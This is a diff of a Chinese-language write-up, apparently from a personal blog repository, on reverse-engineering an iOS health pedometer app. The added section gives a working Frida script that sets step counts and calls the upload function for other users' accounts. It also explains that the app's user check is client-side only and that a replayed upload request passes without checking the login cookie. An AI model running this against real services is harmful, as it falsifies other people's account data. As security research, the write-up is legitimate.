@@ -432,7 +432,7 @@ void __cdecl -[PARSHealthPedometer10thHomeViewController requestUploadWithSure:]
 }
 ```
 
-从这里看出这个函数的参数是传入0或1,也可发现这个函数的进一步调用的函数是`healthWalkUploadTodayPedometer`,但由于`healthWalkUploadTodayPedometer`函数的参数是一个内存地址,需要动态设置,而requestUploadWithSure函数的参数传入"1"即可,用requestUploadWithSure函数更方法用cycript测试,于是直接在cycript中测试requestUploadWithSure(1),验证是否是关键函数,操作如下:
+从这里看出这个函数的参数是传入0或1,也可发现这个函数的进一步调用的函数是`healthWalkUploadTodayPedometer`,但由于`healthWalkUploadTodayPedometer`函数的参数是一个内存地址,需要动态设置,而requestUploadWithSure函数的参数传入"1"即可,用requestUploadWithSure函数更方法用[cycript][16]测试,于是直接在cycript中测试requestUploadWithSure(1),验证是否是关键函数,操作如下:
 
 ```
 ssh root@iphone_ip
@@ -464,7 +464,53 @@ tmp1=[PARSHealthPedometer10thHomeViewController alloc]
     生成关键上传函数requestUploadWithSure所在类的一个对象
 [tmp1 requestUploadWithSure:1]
     执行上传步数函数,参数为1
+```
 
+上面是使用cycript给其他用户上传步数,也可通过frida如下实现(执行代码前需要用其他用户的帐号登陆本机app)
+
+```
+import frida
+import sys
+
+session = frida.get_usb_device().attach(1535)
+script_string = """
+
+if (ObjC.available)
+{
+    try
+    {
+        var my_obj1=ObjC.chooseSync(ObjC.classes.PARSPedometerInfo)[0]
+        var my_obj2=ObjC.classes.PARSHealthPedometer10thHomeViewController.alloc()
+        my_obj1["- setIntegratedSteps:"](66666)
+        my_obj2["- requestUploadWithSure:"](1)
+    }
+    catch(err)
+    {
+        console.log("[!] Exception2: " + err.message);
+    }
+}
+else
+{
+    console.log("Objective-C Runtime is not available!");
+}
+"""
+
+
+script = session.create_script(script_string)
+
+
+def on_message(message, data):
+    if message['type'] == 'error':
+        print("[!] " + message['stack'])
+    elif message['type'] == 'send':
+        print("[i] " + message['payload'])
+    else:
+        print(message)
+
+
+script.on('message', on_message)
+script.load()
+sys.stdin.read()
 ```
 
 通过函数给其他用户上传步数时也上传成功了,而在app中给其他用户上传时会弹出无法给其他用户上传的对话框,说明这个对话框对应的校验只是客户端校验,直接调用上传函数可绕过.另外,也可通过直接发burpsuite拦截到的上传包来实现给其他用户上传步数,需要修改burpsuite上传包中的securitytoken和mobilephone参数,其中cookie可随便填写或不填(说明上传步数时未校验登录态),一个可用包如下:
@@ -565,3 +611,4 @@ cycript -p PALxxx
 [13]: https://raw.githubusercontent.com/3xp10it/pic/master/ida_usb_flex3.png
 [14]: https://raw.githubusercontent.com/3xp10it/pic/master/ida_usb_debug_option1.png
 [15]: https://raw.githubusercontent.com/3xp10it/pic/master/ida_usb_debug_option2.png
+[16]: http://www.cycript.org/
